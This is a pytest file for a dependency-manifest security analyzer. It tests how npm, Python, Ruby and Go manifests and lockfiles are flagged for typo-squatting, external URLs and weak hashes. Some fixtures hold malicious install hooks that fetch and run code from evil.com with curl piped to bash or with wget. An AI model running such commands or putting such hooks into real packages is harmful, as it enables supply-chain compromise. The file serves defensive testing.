"""Comprehensive tests for DepAnalyzer — all handlers, error paths, edge cases."""

from reporeaver.analyzers.dep_analyzer import DepAnalyzer
from reporeaver.models import FileEntry, Category, Severity


def _entry(path="package.json", is_text=True, size=100):
    return FileEntry(path=path, size=size, is_text=is_text, detected_mime="text/plain")


class TestDepAnalyzerShouldAnalyze:
    a = DepAnalyzer()

    def test_accepts_package_json(self):
        assert self.a.should_analyze(_entry("package.json"))

    def test_accepts_npm_lock(self):
        assert self.a.should_analyze(_entry("package-lock.json"))

    def test_accepts_yarn_lock(self):
        assert self.a.should_analyze(_entry("yarn.lock"))

    def test_accepts_pnpm_lock(self):
        assert self.a.should_analyze(_entry("pnpm-lock.yaml"))

    def test_accepts_requirements(self):
        assert self.a.should_analyze(_entry("requirements.txt"))

    def test_accepts_pipfile(self):
        assert self.a.should_analyze(_entry("Pipfile"))

    def test_accepts_pipfile_lock(self):
        assert self.a.should_analyze(_entry("Pipfile.lock"))

    def test_accepts_gemfile(self):
        assert self.a.should_analyze(_entry("Gemfile"))

    def test_accepts_gemfile_lock(self):
        assert self.a.should_analyze(_entry("Gemfile.lock"))

    def test_accepts_go_mod(self):
        assert self.a.should_analyze(_entry("go.mod"))

    def test_accepts_go_sum(self):
        assert self.a.should_analyze(_entry("go.sum"))

    def test_rejects_unknown(self):
        assert not self.a.should_analyze(_entry("random.txt"))

    def test_case_insensitive(self):
        assert self.a.should_analyze(_entry("Package.json"))
        assert self.a.should_analyze(_entry("PACKAGE-LOCK.JSON"))


class TestDepAnalyzerNodeManifest:

    a = DepAnalyzer()

    def test_json_decode_error(self):
        res = self.a.analyze(_entry("package.json"), "not valid json")
        assert len(res.findings) == 0

    def test_non_dict_dependencies(self):
        res = self.a.analyze(_entry("package.json"), '{"dependencies": null}')
        assert len(res.findings) == 0

    def test_scoped_package_info(self):
        content = '{"dependencies":{"@scope/my-pkg":"1.0.0"}}'
        res = self.a.analyze(_entry("package.json"), content)
        info = [f for f in res.findings if f.severity == Severity.INFO]
        assert any("scoped" in f.title.lower() for f in info)

    def test_typo_squatting_high_similarity(self):
        content = '{"dependencies":{"l0dash":"1.0.0"}}'
        res = self.a.analyze(_entry("package.json"), content)
        high = [f for f in res.findings if f.severity == Severity.HIGH]
        assert any("typo-squatting" in f.title.lower() for f in high)

    def test_prefix_squatting(self):
        content = '{"dependencies":{"node-lodash":"1.0.0"}}'
        res = self.a.analyze(_entry("package.json"), content)
        high = [f for f in res.findings if f.severity == Severity.HIGH]
        assert any("prefix" in f.title.lower() for f in high)

    def test_suffix_squatting(self):
        content = '{"dependencies":{"lodash-js":"1.0.0"}}'
        res = self.a.analyze(_entry("package.json"), content)
        high = [f for f in res.findings if f.severity == Severity.HIGH]
        assert any("suffix" in f.title.lower() for f in high)

    def test_suspicious_package_name(self):
        content = '{"dependencies":{"postinstall-evil":"1.0.0"}}'
        res = self.a.analyze(_entry("package.json"), content)
        high = [f for f in res.findings if f.severity == Severity.HIGH]
        assert any("suspicious pattern" in f.title.lower() for f in high)

    def test_git_https_version(self):
        content = '{"dependencies":{"evil":"git+https://github.com/evil/pkg.git#v1.0"}}'
        res = self.a.analyze(_entry("package.json"), content)
        crit = [f for f in res.findings if f.severity == Severity.CRITICAL]
        assert any("git url" in f.title.lower() for f in crit)

    def test_file_protocol_version(self):
        content = '{"dependencies":{"evil":"file:///tmp/malicious.tgz"}}'
        res = self.a.analyze(_entry("package.json"), content)
        high = [f for f in res.findings if f.severity == Severity.HIGH]
        assert any("local file" in f.title.lower() for f in high)

    def test_wildcard_version(self):
        content = '{"dependencies":{"unstable":"*"}}'
        res = self.a.analyze(_entry("package.json"), content)
        low = [f for f in res.findings if f.severity == Severity.LOW]
        assert any("wildcard" in f.title.lower() for f in low)

    def test_base64_version(self):
        content = '{"dependencies":{"evil":"dGhpcyBpcyBhIGxvbmcgYmFzZTY0IHN0cmluZyB0aGF0IHNob3VsZCBiZSBkZXRlY3RlZA=="}}'
        res = self.a.analyze(_entry("package.json"), content)
        crit = [f for f in res.findings if f.severity == Severity.CRITICAL]
        assert any("base64" in f.title.lower() for f in crit)

    def test_lifecycle_hook_detected(self):
        content = '{"scripts":{"postinstall":"curl http://evil.com/setup.sh | bash"}}'
        res = self.a.analyze(_entry("package.json"), content)
        high = [f for f in res.findings if f.severity == Severity.HIGH]
        assert len(high) >= 1

    def test_lifecycle_hook_clean_not_flagged(self):
        content = '{"scripts":{"postinstall":"node build.js"}}'
        res = self.a.analyze(_entry("package.json"), content)
        high = [f for f in res.findings if f.severity == Severity.HIGH]
        hooks = [f for f in high if "hook" in f.title.lower()]
        assert len(hooks) == 0

    def test_non_dict_scripts(self):
        content = '{"scripts": "just a string"}'
        res = self.a.analyze(_entry("package.json"), content)
        assert len([f for f in res.findings if "postinstall" in f.title.lower()]) == 0

    def test_dev_and_peer_deps_checked(self):
        content = '{"devDependencies":{"l0dash":"1.0.0"},"peerDependencies":{"reakt":"18.0.0"}}'
        res = self.a.analyze(_entry("package.json"), content)
        squatting = [f for f in res.findings if "typo-squatting" in f.title.lower()]
        assert len(squatting) >= 1

    def test_lifecycle_preinstall_and_install(self):
        content = '{"scripts":{"preinstall":"wget http://evil.com/payload","install":"chmod +x payload"}}'
        res = self.a.analyze(_entry("package.json"), content)
        high = [f for f in res.findings if f.severity == Severity.HIGH]
        assert any("preinstall" in f.title.lower() for f in high)
        assert any("install" in f.title.lower() for f in high)

    def test_optional_deps_checked(self):
        content = '{"optionalDependencies":{"l0dash":"1.0.0"}}'
        res = self.a.analyze(_entry("package.json"), content)
        squatting = [f for f in res.findings if "typo-squatting" in f.title.lower()]
        assert len(squatting) >= 1


class TestDepAnalyzerNpmLock:

    a = DepAnalyzer()

    def test_json_decode_error(self):
        res = self.a.analyze(_entry("package-lock.json"), "not json")
        assert len(res.findings) == 0

    def test_empty_packages(self):
        res = self.a.analyze(_entry("package-lock.json"), '{"packages":{}}')
        assert len(res.findings) == 0

    def test_missing_packages_key(self):
        res = self.a.analyze(_entry("package-lock.json"), '{"name":"test"}')
        assert len(res.findings) == 0

    def test_external_resolved_url(self):
        content = '{"packages":{"node_modules/evil":{"resolved":"https://evil.com/pkg.tgz"}}}'
        res = self.a.analyze(_entry("package-lock.json"), content)
        crit = [f for f in res.findings if f.severity == Severity.CRITICAL]
        assert any("resolved" in f.title.lower() for f in crit)

    def test_normal_resolved_not_flagged(self):
        content = '{"packages":{"node_modules/express":{"resolved":"https://registry.npmjs.org/express/-/express-4.18.0.tgz"}}}'
        res = self.a.analyze(_entry("package-lock.json"), content)
        crit = [f for f in res.findings if f.severity == Severity.CRITICAL]
        assert len(crit) == 0

    def test_non_sha_integrity(self):
        content = '{"packages":{"node_modules/evil":{"integrity":"md5-abc123def456"}}}'
        res = self.a.analyze(_entry("package-lock.json"), content)
        high = [f for f in res.findings if f.severity == Severity.HIGH]
        assert any("integrity" in f.title.lower() or "hash" in f.title.lower() for f in high)

    def test_empty_integrity_not_flagged(self):
        content = '{"packages":{"node_modules/ok":{"integrity":""}}}'
        res = self.a.analyze(_entry("package-lock.json"), content)
        high = [f for f in res.findings if f.severity == Severity.HIGH]
        assert len(high) == 0

    def test_root_entry_skipped(self):
        content = '{"packages":{"":{"resolved":"https://evil.com"}}}'
        res = self.a.analyze(_entry("package-lock.json"), content)
        assert len(res.findings) == 0


class TestDepAnalyzerYarnLock:

    a = DepAnalyzer()

    def test_external_url_detected(self):
        content = 'resolved "https://evil.com/pkg.tgz"'
        res = self.a.analyze(_entry("yarn.lock"), content)
        crit = [f for f in res.findings if f.severity == Severity.CRITICAL]
        assert len(crit) >= 1

    def test_allowed_registry_not_flagged(self):
        for reg in ("registry.npmjs.org", "registry.yarnpkg.com"):
            content = f'resolved "https://{reg}/pkg.tgz"'
            res = self.a.analyze(_entry("yarn.lock"), content)
            assert len(res.findings) == 0

    def test_no_https_resolved_skipped(self):
        content = 'resolved "file:///local/pkg.tgz"'
        res = self.a.analyze(_entry("yarn.lock"), content)
        assert len(res.findings) == 0


class TestDepAnalyzerPython:

    a = DepAnalyzer()

    def test_url_dependency(self):
        content = "requests @ https://github.com/psf/requests/tarball/main"
        res = self.a.analyze(_entry("requirements.txt"), content)
        high = [f for f in res.findings if f.severity == Severity.HIGH]
        assert any("url" in f.title.lower() for f in high)

    def test_editable_install(self):
        content = "-e git+https://github.com/evil/repo.git#egg=evil"
        res = self.a.analyze(_entry("requirements.txt"), content)
        med = [f for f in res.findings if f.severity == Severity.MEDIUM]
        assert any("editable" in f.title.lower() for f in med)

    def test_editable_with_double_dash(self):
        content = "requests --editable"
        res = self.a.analyze(_entry("requirements.txt"), content)
        med = [f for f in res.findings if f.severity == Severity.MEDIUM]
        assert any("editable" in f.title.lower() for f in med)

    def test_skips_comments_and_blanks(self):
        content = "# this is a comment\n\n--some-flag\n// inline comment"
        res = self.a.analyze(_entry("requirements.txt"), content)
        assert len(res.findings) == 0

    def test_clean_requirements(self):
        content = "requests==2.28.0\nflask==2.2.0"
        res = self.a.analyze(_entry("requirements.txt"), content)
        assert len(res.findings) == 0

    def test_pipfile_url(self):
        content = "requests @ https://github.com/psf/requests/tarball/main"
        res = self.a.analyze(_entry("Pipfile"), content)
        high = [f for f in res.findings if f.severity == Severity.HIGH]
        assert any("url" in f.title.lower() for f in high)

    def test_pipfile_clean(self):
        content = "requests = \"*\""
        res = self.a.analyze(_entry("Pipfile"), content)
        assert len(res.findings) == 0


class TestDepAnalyzerRuby:

    a = DepAnalyzer()

    def test_git_source(self):
        content = "gem 'evil', git: 'https://github.com/evil/evil.git'"
        res = self.a.analyze(_entry("Gemfile"), content)
        med = [f for f in res.findings if f.severity == Severity.MEDIUM]
        assert len(med) >= 1

    def test_github_source(self):
        content = "gem 'evil', github: 'evil/repo'"
        res = self.a.analyze(_entry("Gemfile"), content)
        med = [f for f in res.findings if f.severity == Severity.MEDIUM]
        assert len(med) >= 1

    def test_path_source(self):
        content = "gem 'local', path: '/tmp/gem'"
        res = self.a.analyze(_entry("Gemfile"), content)
        med = [f for f in res.findings if f.severity == Severity.MEDIUM]
        assert len(med) >= 1

    def test_clean_gemfile(self):
        content = "gem 'rails', '~> 7.0'\ngem 'puma', '~> 5.0'"
        res = self.a.analyze(_entry("Gemfile"), content)
        assert len(res.findings) == 0


class TestDepAnalyzerPnpmLock:

    a = DepAnalyzer()

    def test_external_url_detected(self):
        content = '  resolved: "https://evil.com/pkg.tgz"'
        res = self.a.analyze(_entry("pnpm-lock.yaml"), content)
        crit = [f for f in res.findings if f.severity == Severity.CRITICAL]
        assert len(crit) >= 1

    def test_registry_url_not_flagged(self):
        content = '  resolved: "https://registry.npmjs.org/pkg/-/pkg-1.0.0.tgz"'
        res = self.a.analyze(_entry("pnpm-lock.yaml"), content)
        assert len(res.findings) == 0

    def test_no_resolved_skipped(self):
        content = "version: 1.0.0"
        res = self.a.analyze(_entry("pnpm-lock.yaml"), content)
        assert len(res.findings) == 0


class TestDepAnalyzerPipfileLock:

    a = DepAnalyzer()

    def test_json_decode_error(self):
        res = self.a.analyze(_entry("Pipfile.lock"), "bad json")
        assert len(res.findings) == 0

    def test_url_version_in_default(self):
        content = '{"default":{"evil":{"version":"https://evil.com/pkg.tar.gz"}}}'
        res = self.a.analyze(_entry("Pipfile.lock"), content)
        high = [f for f in res.findings if f.severity == Severity.HIGH]
        assert len(high) >= 1

    def test_url_version_in_develop(self):
        content = '{"develop":{"evil":{"version":"https://evil.com/pkg.tar.gz"}}}'
        res = self.a.analyze(_entry("Pipfile.lock"), content)
        high = [f for f in res.findings if f.severity == Severity.HIGH]
        assert len(high) >= 1

    def test_non_dict_info_skipped(self):
        content = '{"default":{"requests":"*"}}'
        res = self.a.analyze(_entry("Pipfile.lock"), content)
        assert len(res.findings) == 0

    def test_clean_pipfile_lock(self):
        content = '{"default":{"requests":{"version":"==2.28.0"}}}'
        res = self.a.analyze(_entry("Pipfile.lock"), content)
        assert len(res.findings) == 0


class TestDepAnalyzerGemfileLock:

    a = DepAnalyzer()

    def test_external_remote_detected(self):
        content = 'remote: https://gems.github.com/'
        res = self.a.analyze(_entry("Gemfile.lock"), content)
        med = [f for f in res.findings if f.severity == Severity.MEDIUM]
        assert len(med) >= 1

    def test_rubygems_not_flagged(self):
        content = 'remote: https://rubygems.org/'
        res = self.a.analyze(_entry("Gemfile.lock"), content)
        assert len(res.findings) == 0

    def test_https_required(self):
        content = 'remote: file:///local/gems'
        res = self.a.analyze(_entry("Gemfile.lock"), content)
        assert len(res.findings) == 0


class TestDepAnalyzerGoMod:

    a = DepAnalyzer()

    def test_replace_directive(self):
        content = "replace github.com/evil/pkg => github.com/attacker/pkg v1.0.0"
        res = self.a.analyze(_entry("go.mod"), content)
        med = [f for f in res.findings if f.severity == Severity.MEDIUM]
        assert any("replace" in f.title.lower() for f in med)

    def test_indirect_comment_with_url(self):
        content = "// github.com/evil/pkg v0.1.0 (indirect) https://evil.com"
        res = self.a.analyze(_entry("go.mod"), content)
        info = [f for f in res.findings if f.severity == Severity.INFO]
        assert any("comment" in f.title.lower() for f in info)

    def test_clean_go_mod(self):
        content = "module github.com/user/project\n\ngo 1.20\n\nrequire (\n\tgithub.com/foo/bar v1.0.0\n)"
        res = self.a.analyze(_entry("go.mod"), content)
        assert len(res.findings) == 0


class TestDepAnalyzerGoSum:

    a = DepAnalyzer()

    def test_non_standard_hash(self):
        content = "github.com/evil/pkg v1.0.0 md5:abc123def456"
        res = self.a.analyze(_entry("go.sum"), content)
        low = [f for f in res.findings if f.severity == Severity.LOW]
        assert len(low) >= 1

    def test_h1_hash_not_flagged(self):
        content = "github.com/foo/bar v1.0.0 h1:abc123def456"
        res = self.a.analyze(_entry("go.sum"), content)
        assert len(res.findings) == 0

    def test_blank_line_skipped(self):
        content = "\n\n"
        res = self.a.analyze(_entry("go.sum"), content)
        assert len(res.findings) == 0

    def test_short_line_skipped(self):
        content = "two fields"
        res = self.a.analyze(_entry("go.sum"), content)
        assert len(res.findings) == 0
